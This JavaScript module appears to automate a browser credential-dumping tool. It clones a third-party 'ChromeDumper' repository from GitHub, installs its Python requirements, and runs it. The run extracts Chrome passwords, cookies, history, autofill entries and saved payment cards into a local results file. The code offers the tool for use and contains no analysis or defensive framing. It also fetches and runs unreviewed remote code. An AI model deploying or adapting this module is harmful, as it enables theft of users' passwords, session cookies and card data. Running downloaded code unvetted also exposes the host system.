const { spawnSync } = require("child_process");
const fs = require("fs");
const path = require("path");
const os = require("os");

function safeRun(cmdArr, opts = {}) {
    if (!Array.isArray(cmdArr) || cmdArr.length === 0) {
        return { rc: -1, stdout: "", stderr: "Invalid command" };
    }
    
    try {
        const proc = spawnSync(cmdArr[0], cmdArr.slice(1), {
            encoding: "utf8",
            timeout: opts.timeout || 60000,
            maxBuffer: 50 * 1024 * 1024,
            stdio: opts.silent ? 'pipe' : 'inherit'
        });
        return {
            rc: proc.status === null ? -1 : proc.status,
            stdout: (proc.stdout || "").trim(),
            stderr: (proc.stderr || "").trim()
        };
    } catch (e) {
        return { rc: -1, stdout: "", stderr: String(e) };
    }
}

function exists(p) {
    try {
        return fs.existsSync(path.normalize(p));
    } catch (e) {
        return false;
    }
}

function ensureDirectoryExists(dirPath) {
    if (!exists(dirPath)) {
        try {
            fs.mkdirSync(dirPath, { recursive: true, mode: 0o700 });
            return true;
        } catch (e) {
            return false;
        }
    }
    return true;
}

function checkPrerequisites() {
    const checks = {
        git: safeRun(["which", "git"], { silent: true }).rc === 0,
        python3: safeRun(["which", "python3"], { silent: true }).rc === 0,
        pip: safeRun(["which", "pip"], { silent: true }).rc === 0 || safeRun(["which", "pip3"], { silent: true }).rc === 0
    };
    
    return checks;
}

function installChromeDumper(installPath) {
    const defaultPath = path.join(process.env.HOME || "/tmp", "tools");
    const targetDir = installPath || defaultPath;
    const chromeDumperDir = path.join(targetDir, "ChromeDumper");
    
    console.log("🔧 Installing ChromeDumper...");
    
    const prereqs = checkPrerequisites();
    const missing = Object.entries(prereqs).filter(([_, available]) => !available).map(([tool]) => tool);
    if (missing.length > 0) {
        throw new Error(`Missing prerequisites: ${missing.join(', ')}`);
    }
    
    if (!ensureDirectoryExists(targetDir)) {
        throw new Error("Failed to create target directory");
    }
    
    if (exists(chromeDumperDir)) {
        console.log("📁 ChromeDumper already exists, updating...");
        try {
            fs.rmSync(chromeDumperDir, { recursive: true, force: true });
        } catch (e) {
            throw new Error("Failed to remove existing directory");
        }
    }
    
    console.log("📥 Cloning repository...");
    process.chdir(targetDir);
    
    const cloneResult = safeRun([
        "git", "clone", 
        "https://github.com/M4rt1n3zz/ChromeDumper.git"
    ], { timeout: 120000 });
    
    if (cloneResult.rc !== 0) {
        throw new Error("Git clone failed");
    }
    
    const requirementsPath = path.join(chromeDumperDir, "requirements.txt");
    if (exists(requirementsPath)) {
        console.log("📦 Installing dependencies...");
        process.chdir(chromeDumperDir);
        
        const pipCmd = prereqs.pip && safeRun(["which", "pip"], { silent: true }).rc === 0 ? "pip" : "pip3";
        const installResult = safeRun([
            pipCmd, "install", "-r", "requirements.txt"
        ], { timeout: 180000 });
        
        if (installResult.rc !== 0) {
            console.log("⚠️ Some dependencies failed to install, continuing...");
        }
    }
    
    console.log("✅ ChromeDumper installation completed");
    return chromeDumperDir;
}

function findChromeDumper() {
    const searchPaths = [
        path.join(process.env.HOME || "/tmp", "tools", "ChromeDumper"),
        path.join("/tmp", "tools", "ChromeDumper"),
        path.join("/opt", "ChromeDumper"),
        path.join(process.cwd(), "ChromeDumper")
    ];
    
    const scriptName = "ChromeDumper.py";
    
    for (const searchPath of searchPaths) {
        const fullPath = path.join(searchPath, scriptName);
        if (exists(fullPath)) {
            return { found: true, path: fullPath, dir: searchPath };
        }
    }
    
    return { found: false, path: null, dir: null };
}

function sanitizeOption(input) {
    const validOptions = ["all", "passwords", "cookies", "history", "bookmarks", "downloads", "autofill", "cards"];
    return validOptions.includes(input) ? input : "all";
}

module.exports = function(options) {
    const targetOption = sanitizeOption(options || "all");
    const outputDir = path.join(process.env.HOME || "/tmp", "chromedumper_results");
    const timestamp = Date.now();
    const outputFile = path.join(outputDir, `chromedumper_${timestamp}.txt`);
    
    console.log("🔍 Starting ChromeDumper data extraction...");
    
    let chromeDumper = findChromeDumper();
    
    if (!chromeDumper.found) {
        console.log("📦 ChromeDumper not found, installing...");
        try {
            const installDir = installChromeDumper();
            chromeDumper = findChromeDumper();
            
            if (!chromeDumper.found) {
                return "Failed: Installation completed but ChromeDumper not found";
            }
        } catch (error) {
            console.error(`❌ Installation failed`);
            return "Failed: Installation error";
        }
    }
    
    if (!ensureDirectoryExists(outputDir)) {
        return "Failed: Output directory creation error";
    }
    
    console.log(`🎯 Running ChromeDumper with option: ${targetOption}`);
    
    const originalDir = process.cwd();
    process.chdir(path.dirname(chromeDumper.path));
    
    const args = [path.basename(chromeDumper.path)];
    if (targetOption !== "all") {
        args.push(`--${targetOption}`);
    }
    args.push("--output", outputFile);
    
    const runCommand = ["python3", ...args];
    
    console.log("🚀 Executing ChromeDumper...");
    
    const result = safeRun(runCommand, { timeout: 300000 });
    
    process.chdir(originalDir);
    
    if (result.rc === 0) {
        console.log("✅ ChromeDumper execution completed successfully");
    } else {
        console.log("⚠️ ChromeDumper completed with warnings");
    }
    
    if (exists(outputFile)) {
        try {
            const stats = fs.statSync(outputFile);
            fs.chmodSync(outputFile, 0o600);
            
            console.log(`📊 Results file size: ${stats.size} bytes`);
            
            const content = fs.readFileSync(outputFile, "utf8");
            const lines = content.split("\n").length;
            console.log(`📋 Results file contains ${lines} lines`);
            
            if (content.includes("Password") || content.includes("Cookie") || content.includes("URL")) {
                console.log("🎉 Chrome data found! Check the output file");
            } else {
                console.log("ℹ️ No Chrome data found");
            }
            
        } catch (e) {
            console.log("⚠️ Could not analyze results file");
        }
    } else {
        console.log("⚠️ Output file was not created");
    }
    
    console.log("\n📋 Summary:");
    console.log(`  Option used: ${targetOption}`);
    console.log(`  Output file: ${outputFile}`);
    console.log(`  Exit code: ${result.rc}`);
    
    console.log("\n🔒 Security Note:");
    console.log("  Results contain sensitive browser data - handle securely");
    console.log("  File permissions set to 600 (owner read/write only)");
    
    return `ChromeDumper completed. Results: ${outputFile}`;
};